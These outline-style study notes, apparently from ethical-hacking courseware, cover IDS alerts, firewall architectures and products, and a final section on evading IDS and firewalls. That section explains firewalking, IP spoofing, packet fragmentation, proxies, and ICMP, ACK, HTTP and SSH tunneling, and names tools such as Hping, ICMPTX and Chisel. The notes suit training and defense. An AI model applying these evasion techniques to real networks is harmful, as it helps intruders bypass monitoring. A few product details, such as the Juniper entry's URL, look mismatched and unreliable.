			- Despite their effectiveness, HIDS are less commonly used due to the processing overhead required to monitor each system event in real time.
	- Types of IDS Alerts:
		- An Intrusion Detection System (IDS) generates four types of alerts: True Positive, False Positive, False Negative, and True Negative.
		- True Positive (Attack - Alert): A true positive occurs when an IDS correctly detects an actual attack and triggers an alarm. This means the system successfully identifies a real threat, whether it is an actual attack by a malicious actor or a security drill where penetration testing tools are used to test network defenses.
		- False Positive (No Attack - Alert): A false positive occurs when an IDS mistakenly identifies normal system activity as an attack and triggers an alarm. This can lead to unnecessary alerts, causing security personnel to become desensitized to warnings and potentially overlook real threats. During IDS configuration, administrators often analyze false positives to fine-tune detection settings and improve accuracy.
		- False Negative (Attack - No Alert): A false negative is the most critical failure of an IDS, occurring when the system fails to detect and respond to an actual attack. In this case, a threat bypasses detection, leaving the system vulnerable. Reducing false negatives is crucial for maintaining effective security.
		- True Negative (No Attack - No Alert): A true negative occurs when the IDS correctly identifies normal activity and does not generate an alert. This indicates that the system is functioning properly by distinguishing between legitimate behavior and potential threats. True negatives do not pose a risk and confirm that the IDS is operating as expected.
- Firewall:
	- A firewall is a software-based or hardware-based security system positioned at the network gateway to protect the resources of a private network from unauthorized access by users on other networks. Firewalls are typically placed at the junction or gateway between two networks, such as a private network and a public network like the Internet. They examine all incoming and outgoing traffic and block messages based on predetermined security rules that do not meet specified security criteria.
	- Firewalls can filter traffic based on various factors, including the type of traffic, source and destination addresses, and ports. To ensure maximum security, firewalls should be placed on the perimeter of the network, away from the internal resources, so that incoming requests cannot directly access private network resources.\
	- Firewall Architecture:
		- The firewall architecture consists of the following elements:
		- Bastion Host:
			- A bastion host is a specially hardened computer system designed to protect a network from external attacks. It acts as a mediator between the internal (private) and external (public) networks, ensuring that all traffic entering or leaving the network is filtered through the firewall.
			- By enforcing strict access control policies, the bastion host serves as the first line of defense in a firewall architecture, preventing unauthorized access and potential security breaches.
			- A bastion host has two network interfaces:
				- Public Interface: Directly connected to the internet, handling incoming and outgoing traffic.
				- Private Interface: Connected to the internal network (intranet), ensuring that only authorized traffic is allowed.
		- Screened Subnet (DMZ):
			- A screened subnet, also known as a Demilitarized Zone (DMZ), is a protected network segment designed to enhance security by isolating public-facing services from the internal network. It is created using a two- or three-homed firewall positioned behind a screening firewall.
			- In a three-homed firewall setup, the first interface connects to the internet, handling external traffic. The second interface connects to the DMZ, where public-facing servers such as web, email, and DNS servers are located. The third interface connects to the intranet, ensuring that private network resources remain protected. The DMZ is designed to handle public requests without exposing the internal network, meaning internet users can communicate with the DMZ but cannot access the private intranet.
			- The key advantage of a screened subnet is that public requests can be managed without allowing direct traffic into the internal network, reducing security risks. However, a major disadvantage of using a three-homed firewall is that if it is compromised, both the DMZ and the internal network could also be at risk. A more secure approach is to use multiple firewalls: one to separate the internet from the DMZ and another to separate the DMZ from the internal network.
		- Multi-Homed Firewall:
			- A multi-homed firewall is a network node equipped with multiple NICs, enabling it to connect to two or more networks. Each interface is assigned to a distinct network segment, both logically and physically, providing enhanced security and traffic control.
			- By using multiple interfaces, a multi-homed firewall improves the efficiency, reliability, and security of an IP network. With more than three interfaces, it allows for further segmentation of systems based on an organization's specific security objectives. This segmentation helps enforce stricter access controls and minimizes the risk of unauthorized access.
			- However, a more secure model is the back-to-back firewall architecture, where two or more firewalls work in tandem to create multiple layers of security. This setup provides deeper protection by further isolating network segments based on security policies and organizational needs.
	- Demilitarized Zone (DMZ):
		- In computer networks, a Demilitarized Zone (DMZ) is a designated area that hosts one or more computers or a small sub-network, acting as a neutral zone between a company's internal network and an untrusted external network. Its primary purpose is to prevent direct access to the company's private data while allowing public-facing services to remain accessible.
		- The DMZ serves as a buffer between the secure internal network and the insecure internet, adding an extra layer of security to the corporate LAN. This prevents external users from directly accessing sensitive internal resources. A DMZ is typically created using a firewall with three or more network interfaces, each assigned a specific role: one for the trusted internal network, one for the DMZ, and one for the untrusted external network (internet).
		- Any service that needs to be accessible to external users, such as email, web, or FTP servers, can be placed in the DMZ. By isolating these services from the internal network, the DMZ minimizes security risks while still allowing controlled public access.
	- Types of Firewalls:
		- Based on Configuration:
			- Network-Based Firewalls:
				- Network-based firewalls are positioned at the network perimeter to inspect packet headers and enforce security rules, protecting the private local area network (LAN) by determining whether to forward or drop packets. They are an integral part of network security and can be built into broadband routers or used as standalone devices.
				- These firewalls employ packet filtering, a technique that examines packet headers to identify the source and destination addresses. The firewall then compares this information against a predefined set of rules—either system-defined or user-configured—to decide whether the packet should be forwarded or discarded.
				- Network-based firewalls operate on an entire network rather than individual systems, using a single interface to manage traffic. Examples of network-based firewalls include Cisco ASA and FortiGate.
				- Advantages: Network-based firewalls provide enhanced security by operating with dedicated operating systems (OS), which helps reduce security risks and improve control measures. They offer high-speed processing, enabling faster response times and handling greater traffic volumes efficiently. Additionally, as independent network components, they allow for easy reconfiguration, shutdown, or relocation with minimal disruption.
				- Disadvantages: Network-based firewalls are generally more expensive than host-based alternatives and can be complex to implement and configure. They also require additional physical space and cabling, which may increase setup and maintenance efforts.
			- Host-Based Firewalls:
				- Host-based firewalls are software-based traffic filters installed on individual PCs or servers, providing security against unauthorized access, Trojans, and email worms. They function between regular applications and the networking components of the operating system.
				- A host-based firewall integrates itself into the critical application/network path, analyzing data flow against a predefined rule set. It intercepts all incoming network requests to determine their validity. Additionally, it incorporates user-defined controls, privacy controls, web filtering, and content filtering to restrict unsafe applications from running on an individual system.
				- Host-based firewalls consume more system resources than network-based firewalls, potentially reducing system performance.
				- Advantages: One of the key advantages of host-based firewalls is that they are less expensive than network-based firewalls, making them ideal for personal or home use. They are also suitable for mobile users who require digital security when working outside a corporate network. Additionally, they are easier to configure and reconfigure compared to network-based firewalls.
				- Disadvantages: Despite these benefits, host-based firewalls have some drawbacks. They consume system resources, which can slow down performance, and they can be difficult to uninstall. Moreover, they are not suitable for environments that require high-speed response times, making them less effective in performance-critical settings.
		- Based on Working Mechanism:
			- Packet Filtering Firewall:
				- A packet filtering firewall inspects and compares each packet against predefined criteria, such as source and destination IP addresses, port numbers, and protocols, to decide whether to allow or block it. Operating at the Internet layer of the TCP/IP model or the Network layer of the OSI model.
				- It analyzes packet headers information to determine routing. This firewall type efficiently controls traffic based on rule sets.
			- Circuit-Level Gateway Firewall:
				- A circuit-level gateway firewall operates at the Session layer of the OSI model or the Transport layer of the TCP/IP model. It forwards data between networks without verifying individual packets, blocking direct incoming connections while allowing traffic to pass through itself.
				- This firewall masks internal network details by making outbound traffic appear to originate from the gateway’s IP address. It monitors session requests and determines their validity by checking the TCP handshake. Unlike packet filters, circuit-level gateways control data streams rather than filtering individual packets. They are cost-effective and provide anonymity for protected networks.
			- Application-Level Firewall:
				- Application-level firewalls (proxies) operate at the Application layer of the OSI and TCP/IP models, filtering packets based on specific application protocols. They restrict traffic to supported services while blocking all others. These firewalls address the risks posed by voice, video, and collaborative traffic at lower layers, which can be exploited for unauthorized access.
				- Configured as web proxies, they can block FTP, Gopher, Telnet, and other protocols while inspecting application-specific commands like HTTP POST and GET. Unlike traditional firewalls, application-level firewalls detect and filter malicious traffic missed by stateful inspection firewalls, improving security. They also perform deep packet inspection, identifying threats hidden within legitimate protocols.
				- Application-layer firewalls can operate in one of two modes:
					- Active application-layer firewalls: These firewalls inspect all incoming requests, including the actual messages exchanged, for known vulnerabilities such as SQL injection, parameter and cookie tampering, and cross-site scripting. Only requests deemed legitimate are allowed to pass through.
					- Passive application-layer firewalls: These function similarly to intrusion detection systems (IDS) by monitoring all incoming requests for known vulnerabilities. However, unlike active firewalls, they do not actively block or reject requests, even if a potential attack is detected.
			- Stateful Multilayer Inspection Firewall:
				- Stateful multilayer inspection firewalls integrate packet filtering, circuit-level gateways, and application-layer inspection to assess both the legitimacy of network-layer sessions and the contents of packets at the application layer. They filter packets at the network layer of the OSI model (or the internet layer of the TCP/IP model) to verify whether session packets are valid, while also analyzing packet contents at the application layer.
				- By using stateful packet filtering, these firewalls overcome the limitations of traditional packet-filtering firewalls, which can only inspect attributes such as IP addresses, ports, and protocols. Additionally, stateful multilayer inspection firewalls are capable of performing deep packet inspection, enhancing security by identifying and mitigating potential threats more effectively.
			- Application Proxy:
				- An application-level proxy acts as an intermediary between a user’s workstation and the Internet, filtering connections based on protocols and service types. For example, an FTP proxy allows only FTP traffic while blocking other services. It enhances security by isolating the enterprise network from external threats. Also known as an application-level gateway, a proxy renews connections and manages communication between users and Internet services. It operates on a firewall host, often a dual-homed or bastion host, for security purposes.
				- Caching proxies improve efficiency by storing frequently requested data, reducing network load and response times. Proxy servers offer both security and caching benefits while providing a transparent experience, making it appear as though users and servers are directly communicating.
				- Advantages: They enhance logging capabilities by understanding application protocols, enabling effective activity monitoring. They also reduce network load by caching frequently requested data, allowing direct retrieval from the system instead of the network. Proxy systems provide user-level authentication since they actively manage connections. Additionally, they protect weak or faulty IP implementations by acting as intermediaries, generating new IP packets on behalf of clients.
				- Disadvantages: proxy services have some drawbacks. They may lag behind non-proxy services until suitable proxy software is available. Different services within a proxy might require separate servers, increasing complexity. Furthermore, proxy services may necessitate changes in client configurations, applications, or procedures, which can add to administrative overhead.
			- Network Address Translation (NAT):
				- Network Address Translation (NAT) separates IP addresses into two sets, allowing a LAN to manage both internal and external traffic while preserving address privacy. NAT helps conceal the internal network layout and directs all connections through a single choke point, enhancing security.
				- It also works with a router, NAT modifies packets in real-time, similar to packet filtering. When an internal machine sends a packet to an external machine, NAT changes the source address to make it appear as if it originates from a valid external address. Conversely, when the external machine responds, NAT modifies the destination address to map it back to the correct internal device. Additionally, NAT can alter source and destination port numbers as needed.
				- NAT reduces the number of public IP addresses required by an organization and can function as a firewall by allowing only outbound connections from the internal network while blocking unsolicited inbound connections from external sources.
				- NAT Translation Schemes:
					- NAT systems use different methods to translate between internal and external addresses:
					- One-to-One Mapping: Each internal address is assigned a dedicated external address, maintaining a consistent translation. However, this method slows down connections and does not save address space.
					- Dynamic Address Allocation: An external address is dynamically assigned to an internal host when it initiates a connection, without modifying port numbers. This limits the number of simultaneous connections to the number of available external addresses.
					- Static Address with Port Mapping: Internal addresses are mapped to a fixed external address, but port mapping allows multiple internal machines to share the same external address.
					- Dynamic Address and Port Allocation: Each time an internal host initiates a connection, an external address and port pair are dynamically assigned. This method optimizes address usage most efficiently.
				- Advantages:It enhanced security by enforcing firewall controls over outbound connections and restricting incoming traffic to only those packets that are part of an active session initiated from within the network. Additionally, it conceals the internal network’s configuration, making it harder for attackers to target specific systems.
				- Disadvantages: NAT also has drawbacks. It must determine how long to retain a translation, which can be unpredictable. It may interfere with encryption and authentication systems, potentially impacting data security. Furthermore, dynamic port allocation can cause conflicts with packet filtering mechanisms, leading to network disruptions.
			- Virtual Private Network (VPN) Firewall:
				- A Virtual Private Network (VPN) is a secure network that allows access to a private network over the Internet. VPNs are commonly used to connect Wide Area Networks (WANs), enabling computers on one network to connect to computers on another network. They ensure the secure transmission of sensitive information over an untrusted network through encapsulation and encryption. By employing encryption and integrity protection, VPNs enable the use of a public network as if it were a private one.
				- A VPN handles encryption and decryption outside the packet-filtering perimeter, allowing for the inspection of packets from other sites. It establishes a virtual point-to-point connection using dedicated connections and encapsulates packets sent over the Internet. This setup combines the advantages of both public and private networks.
				- While VPNs are not directly related to firewall technology, firewalls can enhance VPN functionality by adding additional security features. Firewalls help provide secure remote access and manage traffic flow through the VPN tunnel. A device running VPN software can only access the VPN, ensuring a secure connection. VPN firewalls improve security by encrypting data and controlling the flow of traffic between VPN endpoints, ensuring that only authorized traffic passes through while applying firewall rules to prevent unauthorized access.
				- Advantages: A VPN conceals all traffic that flows through it, ensuring encryption, and safeguarding data from unauthorized access or snooping. Additionally, it provides remote access to various protocols while protecting users from potential attacks originating from the broader Internet.
				- Disadvantages: Since the VPN operates over a public network, users can still be vulnerable to attacks on the destination network, despite the security measures in place.
			- Next-Generation Firewalls (NGFWs):
				- Next-generation firewalls (NGFWs) are advanced network security solutions that build upon the capabilities of traditional firewalls. They incorporate features such as deep packet inspection, application awareness and control, integrated intrusion prevention systems (IPS), and cloud-based threat intelligence. These enhanced capabilities enable NGFWs to effectively address dynamic and evolving threat landscapes, providing stronger protection for modern networks.
				- NGFWs operate by analyzing network traffic across multiple layers of the OSI model. This multilayer inspection allows them to detect and block sophisticated threats. They inspect packet payloads, monitor applications, and identify unusual traffic patterns. By integrating various security functions into a single platform, NGFWs enable centralized management and more efficient security operations.
				- NGFWs offer integrated security features like IPS, antimalware, and content filtering, along with detailed visibility into network traffic, user activity, and application behavior for better monitoring and threat detection. They can block sophisticated attacks such as zero-day exploits, ransomware, and APTs using advanced threat intelligence. However, they are more expensive and complex to configure and manage than traditional firewalls, and their advanced functions may introduce latency.
	- Firewall Limitations:
		- Firewall can block access to services like FTP and Telnet, and may restrict Internet access.
		- Firewalls cannot prevent internal attacks, such as those from disgruntled employees working with external attackers, nor can they protect against social engineering or data-driven attacks like phishing emails.
		- Firewalls focus security at a single point, which leaves other systems vulnerable, and can create a bottleneck if all traffic passes through them.
		- They also cannot defend against zero-day viruses or issues caused by faulty network design.
		- Firewalls are not a replacement for antivirus or antimalware tools, cannot block attacks at higher protocol layers, and cannot handle tunneled traffic or threats from infected external devices.
- IDS, IPS, and Firewall Solutions:
	- Intrusion Detection Using YARA Rules (yara.readthedocs.io):
		- YARA is a malware research tool that enables security analysts to detect and classify malware or other malicious code using a rule-based approach. It is a multi-platform tool that runs on Windows, macOS, and Linux. YARA allows analysts to create “rules” or descriptions of malware families using text or binary patterns. These rules analyze specific patterns in files and alert analysts if a file is harmful.
		- A YARA rule consists of a Boolean expression and strings that define its logic. Analysts can use YARA rules to examine private databases or scan malicious binaries across an organization to detect intrusions. Additionally, YARA supports various pattern formats, such as hexadecimal or plain text, along with special operators and strings, allowing analysts to effectively detect a wide range of malware signatures.
		- YARA Tools:
			- yarGen (github.com): yarGen is a tool used to generate YARA rules. Its primary function is to create YARA rules based on strings identified in malware files while filtering out strings that also appear in legitimate (goodware) files. The tool includes a large goodware strings database and an opcode database, both provided as ZIP archives that must be extracted before use.
			- Vovk (github.com)
			- Halogen (github.com)
			- YARA Silly Silly (github.com)
			- yara-forge (github.com)
			- YaraRET (github.com)
	- Intrusion Detection Tools:
		- Intrusion detection tools are designed to detect anomalies within a network. When deployed on a dedicated workstation, these tools read all network packets, reconstruct user sessions, and scan for potential intrusions by identifying attack signatures and statistical anomalies in network traffic. Additionally, they provide real-time, zero-day protection against network attacks and malicious traffic, preventing malware, spyware, port scans, viruses, and both DoS and DDoS attacks from compromising hosts.
		- Snort (www.snort.org):
			- Snort is an open-source network intrusion detection system (NIDS) that performs real-time traffic analysis and packet logging on IP networks. It supports protocol analysis, content searching/matching, and detects various attacks and probes, including buffer overflows, stealth port scans, CGI attacks, SMB probes, and OS fingerprinting attempts. Snort uses a flexible rule-based language to specify traffic to monitor and a modular plug-in architecture for detection. Snort functions as a packet sniffer, a packet logger for network debugging, and a network intrusion prevention system that detects and prevents threats.
			- Snort Rules: Snort’s rule engine enables users to create custom rules tailored to network security needs, distinguishing between normal and malicious activities. It utilizes the libpcap library (for UNIX/Linux) or WinPcap (for Windows), the same library used by tcpdump, for packet sniffing. When Snort operates in promiscuous mode, it captures and analyzes all packets passing through the network, generating alerts based on packet content and predefined rules in the configuration file. Users can also write their own Snort rules for enhanced customization.
		- Suricata (suricata.io):
			- Suricata is a powerful network threat detection engine that supports real-time intrusion detection (IDS), inline intrusion prevention (IPS), network security monitoring (NSM), and offline pcap processing.
			- It analyzes network traffic using an extensive rule and signature language and offers Lua scripting support for detecting complex threats. With standard input and output formats like YAML and JSON, Suricata seamlessly integrates with existing tools such as SIEMs, Splunk, Logstash/Elasticsearch, Kibana, and other databases.
		- Juniper Network’s IDP system (www.solarwinds.com)
		- Samhain HIDS (www.la-samhna.de)
		- OSSEC (www.ossec.net)
		- Zeek (zeek.org)
		- Cisco Secure IPS (www.cisco.com)
	- Intrusion Prevention Tools:
		- Trellix Intrusion Prevention System (www.trellix.com): The Trellix Intrusion Prevention System enables security professionals to detect stealthy botnets, worms, and reconnaissance attacks in advance. It aggregates flow data from switches and routers and analyzes network-level threat behavior to identify and correlate unusual patterns. The system detects and blocks advanced threats across on-premises environments, virtual infrastructures, software-defined data centers, and private or public clouds.
		- Check Point Quantum IPS (www.checkpoint.com)
		- Atomic OSSEC (atomicorp.com)
		- McAfee Host Intrusion Prevention for Desktops (www.mcafee.com)
		- Secure IPS (NGIPS) (www.cisco.com)
		- Palo Alto Advanced Threat Prevention (www.paloaltonetworks.com)
	- Firewalls:
		- Firewalls Based on Configuration:
			- Network-based Firewalls:
				- Cisco Secure Firewall ASA (www.cisco.com)
				- PA-7500 (www.paloaltonetworks.com)
				- FortiGate 7121F (www.fortinet.com)
				- Check Point 28000 Quantum Security Gateway (www.checkpoint.com)
				- Juniper SRX (www.juniper.net)
			- Host-based Firewalls:
				- Microsoft Defender Firewall (www.microsoft.com)
				- ZoneAlarm Pro Firewall (www.zonealarm.com)
				- Comodo Firewall (personalfirewall.comodo.com)
				- Norton Smart Firewall (us.norton.com)
				- McAfee Firewall (www.mcafee.com)
		- Firewalls Based on Working Mechanism:
			- IPFire (www.ipfire.org)
			- pfSense (www.pfsense.org)
			- SonicWall TZ Series (www.sonicwall.com)
			- BIG-IP Advanced Firewall Manager (www.f5.com)
			- Sophos Firewall (www.sophos.com)
			- WatchGuard Firebox (www.watchguard.com)
			- FortiProxy (www.fortinet.com)
			- SonicWall NSa 6700 (www.sonicwall.com)
			- ZYXEL VPN Firewall (www.zyxel.com)
			- DrayTek Vigor2765 (www.draytek.com)
- Evading IDS/Firewalls:
	- IDS/Firewall Evasion Techniques (Identification):
		- Port Scanning:
			- Ports are points through which computers send or receive information from network resources. Port scanning is used to identify open ports and the services running on them. Finding open ports is often an attacker’s first step toward gaining access to a target system. Open ports can then be further probed to identify the version of services, which can help in finding vulnerabilities in these services. Attackers sometimes use automated port-scanning utilities, many of which are easily available.
			- IDSs (Intrusion Detection Systems) can also be identified using port-scanning techniques, which help detect the presence and configuration of security solutions on a network. Attackers frequently employ port scanning to gather information about the services running on a network, including those protected by an IDS.
			- For example, ManageEngine Firewall Analyzer listens on UDP ports 514 and 1514, Snort IDS listens on TCP port 80 and UDP port 53, and Forcepoint NGFW listens on TCP port 443 and UDP port 546.
		- Firewalking:
			- Firewalking is a method used to collect information about remote networks behind firewalls. It is a technique that utilizes TTL (Time to Live) values to determine gateway ACL (Access Control List) filters and map networks by analyzing the response of IP packets. It probes ACLs on packet-filtering routers and firewalls using a method similar to tracerouting. Firewalking involves sending TCP or UDP packets into the firewall where the TTL value is one hop greater than the targeted firewall. If the packet passes through the gateway, the system forwards it to the next hop, where the TTL equals one, and prompts an ICMP error message at the point of rejection, with a "TTL exceeded in transit" message. This method helps locate a firewall, and additional probing can facilitate fingerprinting and identification of vulnerabilities.
			- The detailed information obtained from firewalking can also assist attackers in crafting more precise and stealthy attack strategies, potentially aiding in IDS evasion. Understanding firewall rules can help attackers avoid detection by exploiting allowed ports and protocols, thereby reducing the likelihood of triggering IDS alerts.
			- Firewalk is a well-known tool used for firewalking. It has two phases: a network discovery phase and a scanning phase. It is available in various open-source Linux distributions. Nmap also includes a firewalk script that can be used to perform firewalking. Both Firewalk and the Nmap firewalk scripts provide critical insights into network configurations and firewall rules that can be leveraged to bypass security measures, including IDS, when combined with other evasion techniques.
		- Banner Grabbing:
			- Banners are service announcements provided by applications in response to connection requests, often containing vendor and version information. Banner grabbing is a simple fingerprinting technique used to identify the vendor and firmware version of a firewall or other network services. Knowing the exact firmware or server version allows attackers to craft payloads that exploit known vulnerabilities while avoiding IDS detection patterns.
			- Banner grabbing helps identify the services running on a system. The information obtained can include details about IDS configurations and the target system’s setup. Attackers use this knowledge to understand how an IDS is configured and tailor their actions to evade known detection rules. Additionally, banner grabbing can reveal services running on firewalls. The three primary services that send banners are FTP, Telnet, and web servers.
			- A firewall does not block banner grabbing because the connection between the attacker’s system and the target appears legitimate. Banner grabbing is used to extract banner and application information. For instance, when a user opens a Telnet connection to a known port on the target server and presses Enter a few times, the server may display a response revealing its service details.
			- Many applications respond to connections on specific ports, making them susceptible to banner grabbing. The information obtained can help attackers refine their strategy to further compromise the system. By knowing the web server's vendor and version, an attacker can focus on platform-specific exploit techniques. Services running on ports such as FTP, Telnet, and web servers should not remain open unless necessary, as they are vulnerable to banner grabbing.
		- IP Address Spoofing:
			- IP address spoofing is a technique used by attackers to evade firewalls and Intrusion Detection Systems (IDS) by masquerading as trusted sources. This method involves altering the source IP address in packet headers to conceal the attacker's true identity and bypass security measures. Firewalls and IDS often filter packets based on their source IP addresses to determine whether they originate from legitimate or malicious sources. Attackers create IP packets with forged source addresses, making them appear as though they were sent by a trusted host. By modifying the IP packet header, attackers can deceive the destination host into believing the packet originates from a reliable source.
			- IP spoofing helps attackers hide their true IP addresses, making it difficult for security systems to trace the origin of an attack. By spoofing trusted IP addresses, attackers can gain unauthorized access to systems and networks. Spoofed IP addresses also allow attackers to evade IDS detection, as some systems filter out traffic only from known malicious sources.
			- Many firewalls filter traffic based on IP addresses. By spoofing an IP address, attackers can bypass these filters and gain access to protected networks. IDS solutions also monitor packets from legitimate sources, but attackers can circumvent these defenses using spoofed IP addresses. This technique is commonly used in spamming, phishing, and denial-of-service (DoS) attacks. Tools such as Hping allow attackers to create custom packets with forged IP addresses.
		- Source Routing:
			- Source routing is a technique in which the sender of a packet specifies the route it should take through the network. Attackers use this method to direct packets through less-secured, less-monitored, or alternative network segments where IDS/firewall solutions are either partially implemented or absent. This approach helps attackers reduce the likelihood of triggering IDS alerts and logging access attempts.
			- As packets travel through the network, each router typically examines the destination IP address and determines the next hop to forward the packet. However, in source routing, the sender makes some or all of these routing decisions instead of allowing the network to handle them dynamically.
			- Source routing is categorized into two types:
				- Loose Source Routing: The sender specifies one or more intermediate nodes that the packet must pass through, but routers can still determine other parts of the route.
				- Strict Source Routing: The sender dictates the exact route the packet must follow, and routers must adhere to this predefined path.
		- Tiny Fragments:
			- Attackers create tiny fragments of outgoing packets, forcing some of the TCP packet’s header information into the next fragment. This fragmentation makes it difficult for an Intrusion Detection System (IDS) to reassemble the full traffic stream, which is essential for detecting malicious patterns effectively. Since IDS filter rules rely on recognizing specific patterns, they may fail to match fragmented packets due to the broken header information.
			- The attack succeeds if the filtering router inspects only the first fragment and allows the remaining fragments to pass unchecked. This technique is commonly used to bypass user-defined filtering rules and is particularly effective when a firewall examines only TCP header information without reassembling the full packet.
		- Bypassing Blocked Sites Using an IP Address Instead of a URL:
			- This method involves entering a blocked website’s IP address directly into the browser’s address bar instead of using its domain name. For example, to access Facebook, a user can type its IP address instead of its domain name.
			- Services such as Host2IP can help users find the IP address of a blocked website. However, this method may fail if the blocking software monitors and restricts access based on the IP address rather than just the domain name.
		- Bypassing Blocked Sites Using Anonymous Web-Surfing Services:
			- Anonymous web-surfing sites allow users to browse the internet anonymously and access blocked websites, bypassing firewall restrictions. These sites help users visit restricted pages without revealing their IP address. Some anonymous browsing services also offer the option to encrypt website URLs for added security.
			- A proxy service can be used to access blocked websites. These proxy websites hide the user’s actual IP address and display a different one, preventing websites from detecting and blocking access.
			- Anonymize VPN (anonymize.com): Anonymize VPN routes all internet traffic through an encrypted tunnel, securing connections from the user’s device to protected servers and networks. It also masks the real IP address, ensuring continuous anonymity for all online activities.
			- Online Anonymizers:
				- anonymize.com
				- 2ip.io/anonim
				- www.kproxy.com
				- zendproxy.com
				- proxify.com
				- www.proxysite.com
				- anonymouse.org
				- proxyscrape.com
		- Bypassing IDS/Firewall Using Proxy Server:
			- Find a suitable proxy server.
			- Configure proxy settings on a Windows system:
				- Open the Control Panel and navigate to Network and Internet -> Internet Options.
				- In the Internet Options dialog box, go to the Connections tab and click "LAN settings."
			- Under LAN Settings, check the "Use a proxy server for LAN" option.
			- In the Address box, enter the IP address of the proxy server.
			- In the Port box, enter the port number used by the proxy server for client connections (default: 8080).
			- (Optional) Check "Bypass proxy server for local addresses" if do not want the proxy server to be used for local network connections.
			- Click OK to close the LAN Settings dialog box.
			- Click OK again to close the Internet Options dialog box.
		- Bypassing IDS/Firewall Using ICMP Tunneling Method:
			- The ICMP protocol is primarily used to send error messages and operational information between network devices. Since it is essential for network communication, many users keep it enabled on their networks. Additionally, ICMP is generally not perceived as a significant security risk. However, attackers can exploit this enabled ICMP protocol to perform ICMP tunneling, allowing them to transmit malicious data into the target network. Through ICMP tunneling, attackers can gain full access to a compromised network.
			- ICMP tunneling works by embedding a backdoor shell within the data portion of ICMP Echo packets. According to RFC 792, which defines ICMP operation, the data portion of ICMP packets is unspecified. As a result, most firewalls and IDS solutions do not inspect this portion, allowing arbitrary data—including a backdoor application—to be transmitted undetected. Some administrators leave ICMP open on their firewalls/IDS because it is necessary for tools like ping and traceroute.
			- If ICMP is allowed through the firewall, an attacker can use a tool like ICMPTX (codeberg.org) to tunnel commands inside the payload of ICMP Echo packets, effectively bypassing security controls.
		- Bypassing IDS/Firewall Using ACK Tunneling Method:
			- ACK tunneling is a technique attackers use to bypass firewalls and IDS by exploiting the generally trusted nature of ACK (Acknowledgment) packets. Traditional packet-filtering firewalls define their rule sets primarily based on SYN (Synchronization) packets, which initiate TCP connections. These firewalls often assume that malicious payloads are most likely to be present in SYN packets because they start a session. Once a session is established, ACK packets are used to acknowledge the receipt of data packets. Since these packets follow an ongoing session, firewalls and IDS typically treat them as legitimate traffic.
			- To optimize performance, many firewalls do not inspect ACK packets as rigorously as SYN packets, as a single SYN packet can generate multiple ACK packets in response. Attackers exploit this by injecting malicious payloads into ACK packets, taking advantage of the reduced scrutiny. By tunneling a backdoor application inside TCP packets with the ACK flag set, attackers can bypass firewalls and potentially evade IDS detection.
			- Steps Involved in ACK Tunneling:
				- The attacker establishes a legitimate TCP connection with the target server.
				- Using tools such as Hping or Nping, the attacker crafts ACK packets embedded with malicious payloads. These packets are sent through an existing session to avoid detection.
				- Since firewalls generally assume ACK packets are part of legitimate traffic, they allow them through without thorough inspection. Similarly, IDS solutions may overlook these packets if their focus is primarily on SYN packets or other types of traffic.
		- Bypassing IDS/Firewall Using HTTP Tunneling Method:
			- HTTP tunneling allows attackers to bypass IDS/firewall restrictions and perform various internet tasks. This method can be used if the target company has a public web server where port 80 is open for HTTP traffic and is not filtered by its IDS/firewall. The attacker encapsulates data inside HTTP traffic (via port 80). Many firewalls, including IDS solutions, do not inspect the payload of HTTP packets to verify their legitimacy. As a result, attackers can tunnel traffic through TCP port 80.
			- Tools such as Chisel (github.com) use this technique to tunnel traffic across TCP port 80. Additionally, attackers can leverage tools like HTTPort, HTTHost, and Tunna to perform HTTP tunneling and bypass IDS/firewall protections.
			- Why Do I Need HTTP Tunneling:
				- HTTP tunneling is used in scenarios where network users have restricted connectivity due to a firewall or proxy. In such cases, certain applications may also lack native communication support.
				- Restrictions may include:
					- Blocking of TCP/IP ports, externally initiated traffic, and all network protocols except for a few commonly used ones.
					- Accessing blocked websites.
					- Posting in forums anonymously by hiding the IP address.
					- Using applications such as chat services (ICQ, IRC), instant messengers, games, and web browsers.
					- Securely sharing confidential resources over HTTP.
					- Downloading files with filtered extensions or potentially malicious code.
			- For example, if an organization’s firewall restricts access to all ports except 80 and 443, a user who needs FTP access would be blocked. HTTP tunneling allows FTP usage via the HTTP protocol by creating a bidirectional virtual data connection encapsulated in HTTP traffic.
			- This process works as follows: FTP client software encapsulates FTP data packets (or other protocols like SOAP or JRMP) within HTTP packets, typically using local port 80. These packets are then sent through the firewall or proxy server as standard internet traffic. The HTTP tunneling server, located outside the network, receives these packets, unwraps the FTP data, and forwards them to the remote FTP server, enabling seamless communication.
			- HTTP Tunneling Tools - HTTPort and HTTHost (www.targeted.org):
				- HTTPort allows users to bypass HTTP proxies that block Internet access to services such as email, instant messaging, P2P file sharing, ICQ, newsgroups, FTP, and IRC. The Internet software is configured to connect to a local PC as if it were the required remote server. HTTPort then intercepts that connection and tunnels it through the proxy. It can function on devices such as proxies, IDSs, or firewalls that permit HTTP traffic, thereby enabling access to websites and Internet applications.
				- HTTPort supports tunneling in two modes: SSL/CONNECT mode and remote host mode:
					- In SSL/CONNECT mode, HTTPort creates a tunnel through a proxy independently. This requires the proxy to support a specific HTTP feature called CONNECT HTTP, which is typically disabled by default. This mode is significantly faster but does not support encryption, allowing the proxy to monitor all activities.
					- The remote host mode enables tunneling through any proxy. HTTPort utilizes a specialized server software called HTTHost, which is installed outside the proxy-blocked network. Since HTTHost functions as a web server, HTTPort transmits a series of HTTP requests to it. The proxy interprets this as regular web browsing, thereby permitting the connection. HTTHost then completes its part of the tunneling process, communicating with the target servers. While this mode is slower, it is highly effective in most cases and offers strong data encryption, rendering proxy logging ineffective.
		- Bypassing IDS/Firewalls Using SSH Tunneling Method:
			- SSH protocol tunneling allows unencrypted network traffic to be securely transmitted through an SSH tunnel. For example, when transferring files using the unencrypted FTP protocol, but the target IDS/firewall blocks FTP traffic, data can be sent through an encrypted SSH tunnel instead. Attackers exploit this technique to bypass IDS/firewall restrictions by connecting to external SSH servers and creating SSH tunnels, often routing traffic through port 80 on the remote server to evade detection.
			- OpenSSH: Attackers use OpenSSH (OpenBSD Secure Shell) to encrypt and tunnel all traffic between a local machine and a remote machine, effectively bypassing perimeter security controls. OpenSSH is a suite of programs that enables encrypted communication sessions over a network using the SSH protocol.
			- Performing SSH Tunneling to Bypass Firewalls Using Bitvise (www.bitvise.com):
				- The Bitvise SSH Server provides secure remote login capabilities for Windows workstations and servers by encrypting data during transmission. It is commonly used for remote administration of Windows servers, allowing advanced users to access their home machine from work, their work machine from home, or perform complex tasks such as setting up a VPN using SSH TCP/IP tunneling or providing a secure file repository via SFTP.
